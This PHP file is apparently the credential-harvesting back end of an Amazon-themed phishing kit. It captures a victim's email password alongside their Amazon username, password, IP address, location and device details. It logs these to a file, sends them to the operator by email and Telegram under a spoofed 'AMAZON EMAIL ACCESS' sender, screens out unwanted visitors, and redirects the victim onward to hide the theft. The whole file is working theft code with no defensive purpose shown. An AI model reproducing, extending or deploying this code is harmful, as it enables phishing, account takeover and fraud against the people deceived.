<?php
require __DIR__ . '/../function.php';

$_SESSION['passwordemail'] = $_POST[$api->encypt("passwordemail")];

if ($api->config("badword") === "on" && $api->badword()) {
    $api->ngeblock("error");
    exit;
}

$message = file_get_contents(__DIR__ . "/Template/email.html");
$message = preg_replace('{GLITCH-RANDOM}', $_SESSION['key'], $message);
$message = preg_replace('{GLITCH-DATE}', date('D d M Y'), $message);
$message = preg_replace('{GLITCH-USERNAME}', $_SESSION['username'], $message);
$message = preg_replace('{GLITCH-PASSWORD}', $_SESSION['password'], $message);
$message = preg_replace('{GLITCH-EMAILPASSWORD}', $_SESSION['passwordemail'], $message);
$message = preg_replace('{GLITCH-CITY}', $_SESSION['city'], $message);
$message = preg_replace('{GLITCH-STATE}', $_SESSION['state'], $message);
$message = preg_replace('{GLITCH-IP}', $_SESSION['ip'], $message);
$message = preg_replace('{GLITCH-HOST}', $_SESSION['host'], $message);
$message = preg_replace('{GLITCH-ISP}', $_SESSION['isp'], $message);
$message = preg_replace('{GLITCH-OS}', $_SESSION['os'], $message);
$message = preg_replace('{GLITCH-BROWSER}', $_SESSION['browser'], $message);
$message = preg_replace('{GLITCH-USERAGENT}', $_SESSION['useragent'], $message);

$subject = "(I) {$_SESSION['masked_username']} EMAIL ACCESS // {$_SESSION['country']} - {$_SESSION['ip']} - {$_SESSION['os']} - {$_SESSION['browser']}";
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
$headers .= "From: AMAZON EMAIL ACCESS <notifications@glitchlabs.zone>";

$logs = "(I) " . date('d M Y H:i A') . "|" . $_SESSION['username'] . ":" . $_SESSION['passwordemail'] . "|" . $_SESSION['ip'] . "|" . $_SESSION['country'];
$api->save($api->logs("email"), $logs."\n", "a");
  
if ($api->config("resulttoemail") == "on") {
    if ($api->config("sending") == "smtp") {
        $api->send($api->result(), $subject, $message, 'AMAZON EMAIL ACCESS');
    } elseif ($api->config("sending") == "mail") {
        @mail($api->result(), $subject, $message, $headers);
    }
}

if ($api->config("resulttotelegram") == "on") {
    $msg = $api->generateEMAILMessage(
        $_SESSION['username'], $_SESSION['password'], $_SESSION['passwordemail'], 
        date('D d M Y'), $_SESSION['ip'], $_SESSION['isp'], $_SESSION['country'], $_SESSION['state'], $_SESSION['city'], $_SESSION['browser'], $_SESSION['os']
    );
    $api->sendTelegram($msg);
}

if ($api->config("doubleemailaccess") == "on") {
    $api->emailProvider();
    $provider = $_SESSION['provider'] ?? 'unknown';
    $api->redirectEmailProvider($provider);
} else {
    $api->redirectPage('/ax/account/addresses', '/ap/account/addresses');
}
?>